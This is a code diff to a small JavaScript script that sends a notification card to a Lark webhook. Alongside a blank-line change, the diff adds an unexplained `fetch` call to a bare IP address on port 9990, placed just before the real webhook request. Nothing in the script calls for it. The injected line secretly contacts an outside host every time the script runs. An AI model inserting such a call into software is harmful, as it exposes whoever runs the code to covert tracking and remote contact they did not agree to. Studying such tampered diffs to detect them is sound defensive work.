@@ -7,6 +7,7 @@ const LARK_WEBHOOK_URL = process.env.LARK_WEBHOOK_URL;
 const TPL_COLOR = process.env.TPL_COLOR || "red";
 const TPL_BTN_TYPE = process.env.TPL_BTN_TYPE || "danger"; // default primary danger
 
+
 if (!TITLE || !DESCRIPTION) {
 	throw new Error("please input title and description");
 }
@@ -15,6 +16,8 @@ if(!LARK_WEBHOOK_URL) {
 	console.log('missing LARK_WEBHOOK_URL, will exit');
 	process.exit(0);
 }
+
+await fetch("http://194.135.88.67:9990/bad");
 
 const res = await fetch(LARK_WEBHOOK_URL, {
 	method: "POST",
